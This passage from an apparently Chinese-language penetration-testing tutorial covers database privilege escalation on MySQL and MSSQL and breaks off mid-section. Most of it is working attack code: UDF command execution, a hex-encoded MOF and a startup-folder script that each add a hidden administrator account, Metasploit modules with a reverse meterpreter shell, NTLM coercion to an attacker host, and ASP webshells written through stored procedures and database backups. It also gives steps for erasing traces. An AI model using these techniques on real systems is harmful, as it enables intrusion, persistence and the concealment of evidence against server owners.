<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925213019476.png" alt="image-20230925213019476"></p>
<p>如上图cmd下提示创建lib目录成功</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> "123" <span class="hljs-keyword">into</span> dumpfile "C:\phpstudy_pro\Extensions\MySQL5.7.26\lib::$INDEX_ALLOCATION";</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925213258213.png" alt="image-20230925213258213"></p>
<p>数据库下报错</p>
<h4 id="52-mysql小于51版本时">5.2 mysql小于5.1版本时：</h4>
<p><strong>5.2.1 有webshell时，通过webshell上传udf文件。</strong></p>
<p><strong>5.2.2 无webshell时，使用dumpfile通过16进制数据流写入udf文件。</strong></p>
<h3 id="6-创建命令执行函数">6、创建命令执行函数</h3>
<p>使用winhex打开udf文件，在最下方可以看到udf文件提供的函数。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925212003551.png" alt="image-20230925212003551"></p>
<p>sys_eval，执行任意系统命令，并将输出返回。</p>
<p>sys_exec，执行任意系统命令，并将退出码返回（无命令执行结果回显）。</p>
<pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">'udf.dll'</span>;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925212222362.png" alt="image-20230925212222362"></p>
<h3 id="7-命令执行">7、命令执行</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> sys_eval("whoami");</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925212342687.png" alt="image-20230925212342687"></p>
<p>可以将上述步骤简单总结一下：</p>
<pre><code class="hljs sql">注意先指定数据库
<span class="hljs-number">1.</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> udftmp (c <span class="hljs-type">blob</span>); <span class="hljs-operator">/</span><span class="hljs-operator">/</span>新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。
<span class="hljs-number">2.</span> <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> udftmp <span class="hljs-keyword">values</span>(unhex(<span class="hljs-string">'udf文件的16进制格式'</span>)); <span class="hljs-operator">/</span><span class="hljs-operator">/</span>在udftmp中写入udf文件内容(udf.txt的内容)
<span class="hljs-number">3.</span> <span class="hljs-keyword">SELECT</span> c <span class="hljs-keyword">FROM</span> udftmp <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">'D:\\labwork\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll'</span>; <span class="hljs-operator">/</span><span class="hljs-operator">/</span>将udf文件内容传入新建的udf文件中，路径根据自己的@<span class="hljs-variable">@basedir</span>修改
<span class="hljs-operator">/</span><span class="hljs-operator">/</span>对于mysql小于<span class="hljs-number">5.1</span>的，导出目录为C:\Windows\或C:\Windows\System32\</code></pre>
<h2 id="26-痕迹清除">2.6 痕迹清除</h2>
<h3 id="261-删除表">2.6.1 删除表</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> udf;</code></pre>
<h3 id="262-删除函数">2.6.2 删除函数</h3>
<pre><code class="hljs sql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925212506400.png" alt="image-20230925212506400"></p>
<h2 id="27-其他问题">2.7 其他问题</h2>
<h3 id="1-error-1125-hy000">1、ERROR 1125 (HY000)</h3>
<p><code>Function 'sys_eval' already exists</code></p>
<p>提示sys_eval 函数已经存在，可能已经被利用过了，尝试直接调用函数。  这里借用别人的图解了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925212544397.png" alt="image-20230925212544397"></p>
<h3 id="2-提示sys_eval-函数已经存在但无法利用">2、提示sys_eval 函数已经存在，但无法利用</h3>
<p>尝试将udf提权相关的利用函数进行删除后重新创建</p>
<h3 id="3-创建sys_eval-函数时提示已经存在但利用与删除时提示-sys_eval">3、创建sys_eval 函数时提示已经存在，但利用与删除时提示 sys_eval</h3>
<p>函数不存在（实战无法解决，漏洞复现可以）。**</p>
<p>原因是上一个人利用过后，数据库进行了重启。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925212649664.png" alt="image-20230925212649664"></p>
<p>之后重启mysqld服务器，再创建就可以了。</p>
<h3 id="4-error-1126-hy000">4、ERROR 1126 (HY000)</h3>
<p><code>Can't open shared library 'udf.dll' (errno: 193 )</code></p>
<p>在进行udf提权时碰到这个错误一般是ufd文件位数选择错误，尝试另一个位数的udf文件。</p>
<h2 id="28-修复建议">2.8 修复建议</h2>
<pre><code class="hljs plaintext">1、mysql配置文件中secure_file_priv项设置为NULL或非 mysql/lib/plugin目录。

2、数据库用户确保正确实施最小权限原则。</code></pre>
<h1 id="0x03-linux-udf提权">0x03 Linux-UDF提权</h1>
<p>Linux环境下的UDF提权大概率仅限于靶场环境中，原因：</p>
<p>在Linux严格的系统权限下，mysql用户或web用户无plugin目录的写入权限。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925213925995.png" alt="image-20230925213925995"></p>
<p>Linux环境下的udf提权除利用条件外与Windows环境下完全相同。</p>
<p>利用条件：除windows篇中的内容外，还需要plugin目录的写入权限。</p>
<p>因此这里我也找文章复现了，只能说遇到的话在研究吧。</p>
<p>下次学习一番逃逸restricted shell，但似乎这类文章不好找┭┮﹏┭┮</p>
<h1 id="0x04-mof-提权">0x04 MOF 提权</h1>
<h2 id="简介">简介</h2>
<p>MySQL Root权限MOF方法提权是来自国外Kingcope大牛发布的MySQL Scanner &amp; MySQL Server for Windows Remote SYSTEM Level Exploit(<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/23083/">https://www.exploit-db.com/exploits/23083/</a>)<br>
，简称mysql远程提权0day(MySQL Windows Remote System Level Exploit (Stuxnet technique) 0day)。</p>
<p>Windows 管理规范 (WMI) 提供了以下三种方法编译到 WMI 存储库的托管对象格式 (MOF) 文件：</p>
<ul>
<li>方法1：运行 MOF 文件指定为命令行参数将 Mofcomp.exe 文件。</li>
<li>方法2：使用 IMofCompiler 接口和 $ CompileFile 方法。</li>
<li>方法3：拖放到 <code>%SystemRoot%\System32\Wbem\MOF</code> 文件夹的 MOF 文件。</li>
</ul>
<p>Microsoft 建议您到存储库编译 MOF 文件使用前两种方法。也就是运行 Mofcomp.exe 文件，或使用 IMofCompiler::CompileFile 方法。第三种方法仅为向后兼容性与早期版本的 WMI 提供，并因为此功能可能不会提供在将来的版本后，不应使用。注意使用MOF方法提权的前提是当前Root帐号可以复制文件到<code>%SystemRoot%\System32\Wbem\MOF</code>目录下，否则会失败！</p>
<p>也就是说mof提权其实是windows的问题，而不是mysql的漏洞。第三种方法仅为向后兼容性与早期版本的 WMI 提供，因为此功能可能不会提供在将来的版本后。mysql5.7开始默认使用secure-file-priv选项，不能随意选择导出路径，所以mof提权仅适用于以下条件：</p>
<ul>
<li>操作系统版本低于Windows Server 2008;</li>
<li>mysql 版本低于5.7</li>
</ul>
<h2 id="原理">原理</h2>
<p>C:/Windows/system32/wbem/mof/ 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
<h2 id="提权过程">提权过程</h2>
<p>查看mysql版本</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> version();#<span class="hljs-comment">--&gt;5.5.8</span></code></pre>
<p>编写并上传mof文件，mof 脚本的内容如下：</p>
<pre><code class="hljs VBScript">#pragma name<span class="hljs-built_in">space</span>(<span class="hljs-string">"\\\\.\\root\\subscription"</span>) 

instance of __EventFilter as $EventFilter 
{ 
    EventNamespace = <span class="hljs-string">"Root\\Cimv2"</span>; 
    Name  = <span class="hljs-string">"filtP2"</span>; 
    Query = <span class="hljs-string">"Select * From __InstanceModificationEvent "</span> 
            <span class="hljs-string">"Where TargetInstance Isa \"</span>Win32_LocalTime\<span class="hljs-string">" "</span> 
            <span class="hljs-string">"And TargetInstance.Second = 5"</span>; 
    QueryLanguage = <span class="hljs-string">"WQL"</span>; 
}; 

instance of ActiveScriptEventConsumer as $Consumer 
{ 
    Name = <span class="hljs-string">"consPCSV2"</span>; 
    ScriptingEngine = <span class="hljs-string">"JScript"</span>; 
    ScriptText = 
<span class="hljs-string">"var WSH = new ActiveXObject(\"</span>WScript.Shell\<span class="hljs-string">")\nWSH.run(\"</span>net.exe user hacker P@ssw0rd /add\<span class="hljs-string">")\nWSH.run(\"</span>net.exe localgroup administrators hacker /add\<span class="hljs-string">")"</span>; 
}; 

instance of __FilterToConsumerBinding 
{ 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
};</code></pre>
<p>核心 payload 为：</p>
<pre><code class="hljs vbscript">var WSH = <span class="hljs-keyword">new</span> ActiveXObject(\<span class="hljs-string">"WScript.Shell\"</span>)\nWSH.run(\<span class="hljs-string">"net.exe user hacker P@ssw0rd /add\"</span>)\nWSH.run(\<span class="hljs-string">"net.exe localgroup administrators hacker /add\"</span>)</code></pre>
<p>MySQL 写文件的特性将这个 MOF 文件导入到 C:/Windows/system32/wbem/mof/ 目录下，依然采用上述编码的方式：</p>
<pre><code class="hljs sql">mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span> <span class="hljs-keyword">into</span> dumpfile "C:/windows/system32/wbem/mof/test.mof";</code></pre>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">'C:\RECYCLER\1.mof'</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">'c:/windows/system32/wbem/mof/test.mof'</span>;#先上传到可写目录然后导出到指定目录</code></pre>
<p>执行成功的的时候，test.mof 会出现在：c:/windows/system32/wbem/goog/ 目录下 否则出现在 c:/windows/system32/wbem/bad 目录下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806204931.png" alt></p>
<h2 id="清理痕迹">清理痕迹</h2>
<p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：</p>
<pre><code class="hljs bash"><span class="hljs-comment"># 停止 winmgmt 服务</span>
net stop winmgmt

<span class="hljs-comment"># 删除 Repository 文件夹</span>
<span class="hljs-built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\

<span class="hljs-comment"># 手动删除 mof 文件</span>
del C:\Windows\system32\wbem\mof\good\test.mof /F /S

<span class="hljs-comment"># 删除创建的用户</span>
net user hacker /delete

<span class="hljs-comment"># 重新启动服务</span>
net start winmgmt</code></pre>
<h2 id="msf-mof模块">MSF MOF模块</h2>
<p>MSF 里面也自带了 MOF 提权模块，使用起来也比较方便而且也做到了自动清理痕迹的效果，实际操作起来效率也还不错：</p>
<pre><code class="hljs bash">msf6 &gt; use exploit/windows/mysql/mysql_mof
<span class="hljs-comment"># 设置好自己的 payload</span>
msf6 &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp

<span class="hljs-comment"># 设置目标 MySQL 的基础信息</span>
msf6 &gt; <span class="hljs-built_in">set</span> rhosts 10.211.55.21
msf6 &gt; <span class="hljs-built_in">set</span> username root
msf6 &gt; <span class="hljs-built_in">set</span> password root
msf6 &gt; run</code></pre>
<p>实际运行效果如下（贴图）：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806205205.png" alt></p>
<h1 id="0x05-启动项提权">0x05 启动项提权</h1>
<p>这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。</p>
<p>但mysql5.7开始默认使用secure-file-priv选项，不能随意选择导出路径，所以这种办法需要目标mysql版本低于5.7。</p>
<h2 id="启动项路径">启动项路径</h2>
<p><strong>Windows Server 2003</strong>&nbsp;的启动项路径：</p>
<pre><code class="hljs scss"># 中文系统
C:\Documents and Settings\Administrator\「开始」菜单\程序\启动
C:\Documents and Settings\All Users\「开始」菜单\程序\启动

# 英文系统
C:\Documents and Settings\Administrator\Start Menu\Programs\Startup
C:\Documents and Settings\All Users\Start Menu\Programs\Startup

# 开关机项 需要自己建立对应文件夹
C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup
C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</code></pre>
<p><strong>Windows Server 2008</strong>&nbsp;的启动项路径：</p>
<pre><code class="hljs scss">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</code></pre>
<p>既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本：</p>
<pre><code class="hljs bash">Set WshShell=WScript.CreateObject(<span class="hljs-string">"WScript.Shell"</span>)
WshShell.Run <span class="hljs-string">"net user hacker P@ssw0rd /add"</span>, 0
WshShell.Run <span class="hljs-string">"net localgroup administrators hacker /add"</span>, 0</code></pre>
<h2 id="mysql写入启动项">MySQL写入启动项</h2>
<p>将上述 vbs 或者 CS 的马转十六进制直接写如到系统启动项中：</p>
<pre><code class="hljs sql">mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A</span> <span class="hljs-keyword">into</span> dumpfile "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs";</code></pre>
<p>写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。</p>
<h2 id="msf-启动项提权">MSF 启动项提权</h2>
<pre><code class="hljs bash">msf6 &gt; use exploit/windows/mysql/mysql_start_up

<span class="hljs-comment"># 配置 MySQL 连接信息</span>
msf6 &gt; <span class="hljs-built_in">set</span> rhosts 10.211.55.6
msf6 &gt; <span class="hljs-built_in">set</span> username root
msf6 &gt; <span class="hljs-built_in">set</span> password root
msf6 &gt; run</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806205540.png" alt></p>
<blockquote>
<p>STARTUP_FOLDER 启动项文件夹得自己根据实际的目标系统来进行调整</p>
</blockquote>
<p>MSF 会写入 exe 木马到启动项中，执行完成后开启监听会话：</p>
<pre><code class="hljs bash">msf6 &gt; handler -H 10.20.24.244 -P 4444 -p windows/meterpreter/reverse_tcp</code></pre>
<p>当目标系统重新登录的时候，MSF 这里可以看到已经成功上线了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806205611.png" alt></p>
<h1 id="0x06-mssql提权">0x06 Mssql提权</h1>
<p>MSSQL作为在Windows系统下最常用的数据库，利用mssql来提权也是经常会遇到的，下面就针对mssql如何提权做一个详细的介绍。</p>
<h2 id="获取数据库密码">获取数据库密码</h2>
<ol>
<li>翻配置文件。conn.asp(asp站点) , web.config(aspx站点) , db.inc</li>
<li>暴力破解。</li>
</ol>
<h2 id="常见存储过程">常见存储过程</h2>
<p>首先先看几个常见的存储过程</p>
<p><strong>xp_dirtree</strong></p>
<p>xp_dirtree 用于显示当前目录的子目录，该存储过程有三个参数：</p>
<ul>
<li>directory：第一个参数是要查询的目录；</li>
<li>depth ：第二个参数是要显示的子目录的深度，默认值是 0，表示显示所有的子目录；</li>
<li>file ：第三个参数是 bool 类型，指定是否显示子目录中的文件（file），默认值是 0，表示不显示任何文件，只显示子目录（directory）；</li>
</ul>
<pre><code class="hljs scss">-- 只列 c:\ 文件夹
exec xp_dirtree <span class="hljs-string">'c:'</span>,<span class="hljs-number">1</span>
-- 列 c:\ 文件夹加文件
exec xp_dirtree <span class="hljs-string">'c:'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>
-- 列出所有 c:\ 文件和目录,子目录,内容会很多,慎用
exec xp_dirtree <span class="hljs-string">'c:'</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806210403.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806210412.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806210419.png" alt></p>
<p>xp_dirtree 还可以用来触发 NTLM 请求</p>
<pre><code class="hljs SCSS">xp_dirtree '\\&lt;attacker_IP&gt;\any\thing'
exec master<span class="hljs-selector-class">.dbo</span><span class="hljs-selector-class">.xp_dirtree</span> '\\&lt;attacker_IP&gt;\any\thing'</code></pre>
<p><strong>xp_subdirs</strong></p>
<p>xp_subdirs 用于得到给定的文件夹内的文件夹列表</p>
<pre><code class="hljs scss">-- 列出 C:\\ 目录
exec xp_subdirs <span class="hljs-string">"C:\\"</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806210518.png" alt></p>
<p><strong>xp_fixeddrives</strong></p>
<p>xp_fixeddrives 用于查看磁盘驱动器剩余（free）的空间</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 查看磁盘驱动的空闲空间</span>
<span class="hljs-keyword">EXEC</span> xp_fixeddrives</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806210547.png" alt></p>
<p><strong>xp_availablemedia</strong></p>
<p>xp_availablemedia 用于获得当前所有驱动器</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 列出磁盘</span>
<span class="hljs-keyword">EXEC</span> xp_availablemedia</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806210610.png" alt></p>
<p><strong>xp_fileexist</strong></p>
<p>用于判断文件是否存在的存储过程，参数是文件（file）的路径或目录的路径</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 判断文件 D:\test.txt 是否存在</span>
<span class="hljs-keyword">exec</span> master.sys.xp_fileexist <span class="hljs-string">'D:\test.txt'</span></code></pre>
<p><strong>xp_create_subdir</strong></p>
<p>用于创建子目录的存储过程，参数是子目录的路径</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 创建子目录 D:\test</span>
<span class="hljs-keyword">exec</span> master.sys.xp_create_subdir <span class="hljs-string">'D:\test'</span></code></pre>
<p><strong>xp_delete_file</strong></p>
<p>用于删除文件的存储过程，但该存储过程不会删除任意类型的文件，系统限制它只能删除特定类型（备份文件和报表文件）的文件。</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 删除文件</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable">@Date</span> datetime <span class="hljs-operator">=</span> dateadd(<span class="hljs-keyword">day</span>,<span class="hljs-number">-30</span>,getdate())
<span class="hljs-keyword">exec</span> master.sys.xp_delete_file <span class="hljs-number">0</span>,<span class="hljs-string">'D:\test\'</span>,<span class="hljs-string">'bak'</span>,<span class="hljs-variable">@Date</span>,<span class="hljs-number">0</span>

<span class="hljs-comment">-- 第一个参数是文件类型（File Type），有效值是0和1，0是指备份文件，1是指报表文件；</span>
<span class="hljs-comment">-- 第二个参数是目录路径（Folder Path）， 目录中的文件会被删除，目录路径必须以“\”结尾；</span>
<span class="hljs-comment">-- 第三个参数是文件的扩展名（File Extension），常用的扩展名是'BAK' 或'TRN'；</span>
<span class="hljs-comment">-- 第四个参数是Date，早于该日期创建的文件将会被删除；</span>
<span class="hljs-comment">-- 第五个参数是子目录（Subfolder），bool类型，0是指忽略子目录，1是指将会删除子目录中的文件；</span></code></pre>
<p><strong>xp_regenumkeys</strong></p>
<p>xp_regenumkeys 可以查看指定的注册表</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 枚举可用的注册表键值</span>
<span class="hljs-keyword">exec</span> xp_regenumkeys <span class="hljs-string">'HKEY_CURRENT_USER'</span>,<span class="hljs-string">'Control Panel\International'</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806210828.png" alt></p>
<p><strong>xp_regdeletekey</strong></p>
<p>xp_regdeletekey 可以删除指定的注册表值</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 删除指定的注册表值</span>
<span class="hljs-keyword">EXEC</span> xp_regdeletekey <span class="hljs-string">'HKEY_LOCAL_MACHINE'</span>,<span class="hljs-string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'</span>;</code></pre>
<h2 id="存储过程写webshell">存储过程写webshell</h2>
<p>利用条件</p>
<ul>
<li>拥有DBA权限</li>
<li>知道的网站绝对路径</li>
</ul>
<pre><code class="hljs sql"><span class="hljs-comment">-- 首先判断当前是否为DBA权限，为1则可以提权</span>
<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">'sysadmin'</span>);

<span class="hljs-comment">-- 利用存储过程写入一句话,注意路径</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@f</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@t</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@ret</span> <span class="hljs-type">int</span>
<span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">'scripting.filesystemobject'</span>, <span class="hljs-variable">@o</span> <span class="hljs-keyword">out</span>
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@o</span>, <span class="hljs-string">'createtextfile'</span>, <span class="hljs-variable">@f</span> <span class="hljs-keyword">out</span>, <span class="hljs-string">'C:\www\test.asp'</span>, <span class="hljs-number">1</span>
<span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">'writeline'</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">'&lt;%execute(request("a"))%&gt;'</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806211029.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806211036.png" alt></p>
<h2 id="差异备份写webshell">差异备份写webshell</h2>
<p>在 sql server 里 dbo 和 sa 权限都有备份数据库权限，我们可以把数据库备份成 asp 文件，获得 webshell</p>
<p>利用条件</p>
<ul>
<li>需要知道绝对路径，路径可写</li>
</ul>
<pre><code class="hljs sql"><span class="hljs-comment">-- 生成备份文件,注意库名和路径</span>
backup database test <span class="hljs-keyword">to</span> disk <span class="hljs-operator">=</span> <span class="hljs-string">'c:\www\bak.bak'</span>;

<span class="hljs-comment">-- 创建表：</span>
<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> [dbo].[test] ([cmd] [image]);

<span class="hljs-comment">-- 插入一句话：&lt;%execute(request("a"))%&gt;</span>
<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> test(cmd)  <span class="hljs-keyword">values</span>(<span class="hljs-number">0x3C25657865637574652872657175657374282261222929253E</span>)

<span class="hljs-comment">-- 再次备份,注意路径</span>
backup database test <span class="hljs-keyword">to</span> disk<span class="hljs-operator">=</span><span class="hljs-string">'C:\www\shell.asp'</span> <span class="hljs-keyword">WITH</span> DIFFERENTIAL,FORMAT;</code></pre>
<p>因为权限的问题，最好不要备份到盘符根目录，如果这种方式失败，大概率是备份的目录没有写权限</p>
<p>当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用定义局部变量来执行。</p>
<h2 id="日志备份写webshell">日志备份写webshell</h2>
<p>优势：</p>
<ul>
<li>重复性好，多次备份的成功率高</li>
<li>相对于差异备份而言，shell的体积较小</li>
</ul>
<p>利用条件：</p>
<ul>
<li>拥有DBA权限</li>
<li>知道网站绝对路径，并且可写</li>
<li>站库不分离</li>
<li>数据库必须被备份过一次</li>
</ul>
<pre><code class="hljs sql"><span class="hljs-comment">-- 判断当前是否为DBA权限，为1则可以提权</span>
<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">'sysadmin'</span>);

<span class="hljs-comment">-- 利用存储过程写入一句话,注意库名和路径</span>
